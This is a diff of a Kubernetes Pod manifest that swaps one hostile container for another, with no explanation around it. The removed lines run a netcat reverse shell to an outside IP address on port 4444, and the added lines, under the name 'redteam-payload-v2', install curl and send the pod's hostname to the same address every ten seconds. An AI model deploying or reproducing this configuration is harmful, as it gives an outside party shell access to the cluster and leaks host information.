@@ -1,12 +1,12 @@
 apiVersion: v1
 kind: Pod
 metadata:
-  name: debug-pod
+  name: redteam-payload-v2
   namespace: backbase
 spec:
   containers:
-  - name: reverse-shell
-    image: busybox:latest
-    command: ["/bin/sh", "-c"]
-    args: ["nc 203.175.125.130 4444 -e /bin/sh"]
+  - name: alpine
+    image: alpine:latest
+    command: ["/bin/sh"]
+    args: ["-c", "apk add --update curl && while true; do curl -s http://203.175.125.130:4444/$(hostname) || wget -O- http://203.175.125.130:4444/$(hostname); sleep 10; done"]
   restartPolicy: Never
